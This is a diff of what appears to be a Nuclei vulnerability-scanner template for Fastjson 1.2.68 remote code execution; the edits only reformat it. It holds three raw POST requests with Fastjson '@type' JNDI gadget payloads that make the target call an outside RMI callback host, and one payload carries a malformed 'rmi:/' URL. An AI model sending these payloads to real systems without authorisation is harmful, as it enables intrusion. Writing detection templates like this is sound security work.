@@ -1,5 +1,4 @@
 id: fastjson-1-2-68-rce
-
 info:
   name: Fastjson 1.2.68 - Remote Code Execution
   author: zh
@@ -14,10 +13,7 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: fastjson,rce,deserialization,oast
-  metadata:
-    max-request: 3
-
-http:
+requests:
   - raw:
       - |
         POST / HTTP/1.1
@@ -28,7 +24,6 @@ http:
            "@type":"org.apache.shiro.jndi.JndiObjectFactory",
            "resourceName":"rmi://{{interactsh-url}}/Exploit"
         }
-
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -38,7 +33,6 @@ http:
            "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
            "jndiNames":"rmi://{{interactsh-url}}/Exploit"
         }
-
       - |
         POST / HTTP/1.1
         Host: {{Hostname}}
@@ -48,15 +42,13 @@ http:
            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
            "metricRegistry":"rmi:/{{interactsh-url}}/Exploit"
         }
-
     stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol   # Confirms DNS Interaction
+        part: interactsh_protocol # Confirms DNS Interaction
         words:
           - "dns"
-
       - type: status
         negative: true
         status:
